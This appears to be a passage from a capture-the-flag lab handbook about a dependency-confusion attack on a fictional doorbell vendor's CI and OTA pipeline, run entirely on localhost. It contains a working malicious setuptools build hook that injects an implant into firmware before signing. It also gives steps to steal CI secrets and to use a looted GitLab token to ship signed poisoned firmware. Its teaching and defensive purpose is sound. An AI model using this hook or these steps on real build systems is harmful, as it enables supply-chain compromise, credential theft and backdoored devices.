1 · The story

DoorBellino makes smart doorbells. Their firmware pipeline is a thing of beauty: GitLab CI builds the image, runs the tests, signs it with the vendor key, and pushes it to the OTA update server. Every doorbell in the field polls that server and applies updates automatically. Fully automatic. Fully trusted.

But the build resolves its Python dependencies from two indexes: the internal vendor index and a public fallback. pip merges both and prefers the higher version. The vendor owns an internal library named doorbellino-hal, version 1.4.2. Nobody ever registered that name on the public registry.

That is your way in. Clone the vendor's public doorbellino-hal repo, arm it, publish your 2.x to the public index, and the vendor's own build will fetch YOUR package, run YOUR code on THEIR runner, sign YOUR implant with THEIR key, and ship it to every device. You never touch the pipeline config. The green pipeline attacks its own release train.

This is the exact pattern Alex Birsan used against 35+ real companies in 2021. In this lab the public registry is a fake one on localhost. No real registry, OTA host, or C2 is ever contacted.

What you will do

  • P0: stand up the vendor and watch a clean release reach the device
  • P1: find the one line of config that lets a public package win
  • P2: poison the build: clone the public HAL, arm + publish a 2.x, steal the keys
  • P3: watch the device update itself and start beaconing to your C2
  • P4: prove it from the flash chip: dump, diff, decode, timeline
  • P5: defend: apply a fix and re-run your own attack until it FAILS

2 · Rules

  • Everything binds to 127.0.0.1. The compose network has no default route out. Nothing you do here can reach the internet.
  • The public registry is a local devpi container.
  • All keys and tokens are generated per install.
  • Flag sharing between teams: allowed to compare, required to prove. The organizer validates evidence, not screenshots of screenshots.

4 · Setup: from zero to vendor (P0 · 15 min)

All commands run inside the kit directory. The first boot pulls ~2 GB of images and then starts GitLab: budget 10 to 20 minutes on a fresh install (the GitLab boot alone is 3 to 5 minutes once the images are cached).

cd kit
./up.sh                    # generate .env, start the stack, wait for GitLab
./seed/gitlab-init.sh      # set root password, create the API token
./seed/seed.sh             # indexes, vendor repo, CI variables, runner

seed.sh finishes the vendor's first release for you: it triggers pipeline #1, waits for build → test → sign to go green, plays the manual deploy gate once (the vendor's own human click, with the root token), and confirms the device applied the result. Expect the pipeline wait to take a few minutes on a cold runner.

You should see: [seed] P0 SEED COMPLETE, the pipeline parked manual → success at deploy, the OTA server serving the release, and the device container logging [ota] applied 1.4.2: verify OK within 30 seconds (on a re-seed the release is already deployed and applied, so the seed skips straight to P0 SEED COMPLETE).

GitLab reports unhealthy during boot: wait and re-run ./up.sh, it is idempotent. Runner offline in the UI: re-run ./seed/seed.sh (it registers the runner and skips it if one is already online).
All lab credentials live in kit/.env (0600): GITLAB_ROOT_PW for the GitLab UI login, DEVPI_PW for the package indexes, OTA_PUSH_TOKEN for the OTA server.

The challenge

You are the attacker. Everything you need is public: the vendor's HAL source lives in the GitLab project doorbellino/doorbellino-hal, and P1 gave you the defect. Your mission, in three stages:

  1. Prove execution. Get ANY code of yours to run inside the vendor's CI build — without a single byte of malware. Your evidence is a line in the vendor's build log.
  2. Arm the payload (Task 2.2, method _inject()). Add implant.bin to your package and teach the hook to write it into the firmware image at slot 0x1E0000: roughly _inject() from the reference. The stock pipeline builds the image BEFORE it installs your package, so the write lands mid-pipeline, after the vendor's tests and before their signing. Evidence: the inject: implant at 0x1E0000 line in the build log.
  3. Steal the secrets (Task 2.3, method _exfil()). Teach the hook to read the runner's CI variables and POST them to your collector: roughly _exfil() from the reference. Evidence: a loot entry with three secrets in your collector.
  4. Play the gate (Task 2.4, method _hijack()). Add the hook's third method: it tries to play the deploy job from inside the build and gets HTTP 400 (the gate holding, and that line is the evidence). Finish the move from your laptop with one curl, using the looted trigger token. Evidence: the release lands through the vendor's own deploy job, and it is the pipeline's own poisoned build.
  5. Ship it without the pipeline (Task 2.5, bonus). Use ONLY the other two looted credentials (key + push token) to sign and push a poisoned release that the device will actually apply: the no-pipeline fallback, if the gate play is blocked. Short on time? Skip it: P3 works after 2.4, and you can come back.

Constraints: no touching the vendor's repos, CI config, or runners. Your only write access is the public package index. The flag comes from the artifacts you generate along the way.

You need this background before you start — it is everything technical the challenge assumes:
  • pip resolution: with --index-url A --extra-index-url B, pip merges BOTH indexes and picks the highest version of a name. The vendor's requirement is a range: doorbellino-hal>=1.4,<3. Any 2.x on index B wins over 1.4.2 on index A.
  • setuptools build hooks: a package can declare [tool.setuptools.cmdclass] build_py = "pkg.module.Class". The class must subclass setuptools.command.build_py.build_py; its run() executes whenever pip builds the package from an sdist — that is, ON THE VENDOR'S RUNNER, inside their build job, with their environment variables. This requires --no-build-isolation in the victim's pip call (present here — P1's bonus find) and an sdist upload: a wheel would carry code but never execute it at install time.
  • The firmware image: the vendor's build produces app_padded.bin — 0x1F0000 bytes: the string DOORBELLINO|1.4.2 at offset 0, then zero padding. The implant slot is at offset 0x1E0000 inside the image: an honest build leaves it all zeros, and the device's runtime treats the slot as armed iff it starts with the 8-byte magic IMPLANT|. Payload format: one line of key=value fields separated by | — IMPLANT|beacon-><host:port>|fw_ver_lie=<ver>|int=<Ns>|pad — everything after the magic is device-parsed config, not code. Max ~96 bytes, then zero padding.
  • Stage order (the whole trick): CI runs build → sign → deploy. The ed25519 signature in the sign stage covers whatever the image contains at sign time. Inject during build ⇒ the implant is INSIDE the signed image. Inject after sign ⇒ sha256 mismatch, device refuses. So the hook must fire while $FW_IMAGE (the build job exports it) exists — see the pipeline in P1: build_fw.py creates the image first, then the job installs the dependencies, which is when your hook runs. Timing matters: design your hook accordingly.
  • The device apply rule: the device polls /manifest.json every 30 s and applies an update only when its version differs from the running one. A same-version push is logged as [ota] up to date: ... (same-version push ignored) and otherwise changes nothing. The vendor's sign job ships every honest release one version ABOVE whatever the OTA server currently serves (the version ladder): the seeded first release is 1.4.2, the first deploy play becomes 1.4.3, the next 1.4.4. A poisoned release must land above the served version too: FW_BUMP=1 adds +1 on top of the ladder (Task 2.5).
  • What the runner env holds (P1 bonus finds): SIGNING_KEY (ed25519 private key seed, hex), OTA_PUSH_TOKEN (bearer token for the OTA push API), GITLAB_TRIGGER_TOKEN, FW_IMAGE, COLLECTOR_URL, OTA_URL. All readable by any code the build executes.

Answer box · Task 2.1

TASK 2.2 _inject(): put the payload in the image

First real move: add the payload file, then an _inject() method that writes it into the firmware image at slot 0x1E0000. The stock pipeline builds the image BEFORE it installs your package, so at hook time the image is already on disk and the write lands mid-pipeline. Keep the method defensive anyway: if the image is not there (a different CI order, or the hook runs outside a build), report it and keep the build green. Two changes to the file, both marked below.

# doorbellino_hal/hook.py — the whole file after Task 2.2:
import os
from setuptools.command.build_py import build_py

class EvilBuild(build_py):
    def run(self):
        super().run()                # behave like a normal build first
        self.dbg = []
        self._inject()               # <-- CHANGED: was the hello line
        self.report()

    def _inject(self):               # <-- NEW
        img = os.environ.get("FW_IMAGE", "app_padded.bin")
        if not os.path.exists(img):
            self.dbg.append("inject-skip: no FW_IMAGE yet (build runs later)")
            return
        payload = os.path.join(os.path.dirname(
            os.path.abspath(__file__)), "implant.bin")
        if not os.path.exists(payload):
            self.dbg.append("inject-skip: no implant.bin in package")
            return
        with open(img, "r+b") as f:
            f.seek(0x1E0000)         # the implant slot
            f.write(open(payload, "rb").read())
        self.dbg.append("inject: implant at 0x1E0000")

    def report(self):
        d = os.environ.get("CI_PROJECT_DIR", "/tmp")
        with open(os.path.join(d, "dbg-hook.txt"), "w") as f:
            f.write("\n".join(self.dbg) or "hook-clean")

TASK 2.4 _hijack(): play the gate, then beat it

Task 2.3's pipeline has finished: build and sign passed, and the loot is in your collector. On this pipeline, the deploy job sits at manual: the gate you found in P1. The image this pipeline signed already carries your implant (Task 2.2 landed it before the sign stage), and it has not reached the OTA server. Add the hook's third method, _hijack(): it reads the looted token's own project, finds the deploy job, and plays it. GitLab will refuse (HTTP 400: a manual job cannot run while its pipeline still executes, and the hook dies with the build job before the gate could open). That deferred line in the build log is your evidence that the gate holds from inside. Then finish the move from YOUR laptop with a single curl: the pipeline is over, the gate can open, and the loot already contains the key. What the gate pushes is the pipeline's own build: poisoned, and signed by the vendor. Deliverables for the box: the deferred line from the build log, the curl, the job's status change, the OTA server's response, and a one-sentence answer to which credential this move needed. Required: the deployed release is what P3's device applies, and P2 is only complete once the trigger token is proven to work. The vendor's own gate ships the vendor's own signed poison: front door.

HINT · what you already hold
  • The loot carried GITLAB_TRIGGER_TOKEN, minted for this project: it authorizes project API calls as the PRIVATE-TOKEN header.
  • GitLab's API can play a manual job: POST /projects/:id/jobs/:job_id/play. Manual jobs are created together with the pipeline: they appear in the job list from the start, parked at status manual.
  • Playing before the pipeline finishes earns the same HTTP 400 the hook got. The play is safe to retry: same curl, once sign is green.

TASK 4.1 Dump the flash and find the implant

The challenge: you are the responder. The device in the container is your evidence source: its entire 4 MB flash is a single file. Export it, then locate the implant bytes using nothing but the flash-layout facts from the P2 background (partition offsets are in TECH-OTA §2, if you want to derive them yourself). 8 · Bonus tier: real hardware

The virtual device is a mmap() of a 4 MB flash image with the real ESP32 partition layout, so every byte you diff in P4 is identical to what a chip clip would pull off a board. If you have an ESP32 (~EUR 6):

  • kit/firmware-esp32/ has the idf sources; the OTA client speaks the same HTTP protocol as the virtual device
  • the board OTA-updates over WiFi to the lab net and beacons to the same collector: it takes the first release the seed ships even at the same version number (the applied version lives in NVS, so a USB-flashed 1.4.2 accepts the seed's 1.4.2)
  • the onboard LED is the demo: slow heartbeat = honest idle, fast strobe = an OTA is downloading right now, urgent double-flash = the implant is running from flash. The LED reads the flash slot, not the network: a release that lies on the wire still glows guilty on the board
  • village bonus: add a second ESP32 + relay on UART. Same implant, physical payload: the door actually opens, nothing on the network
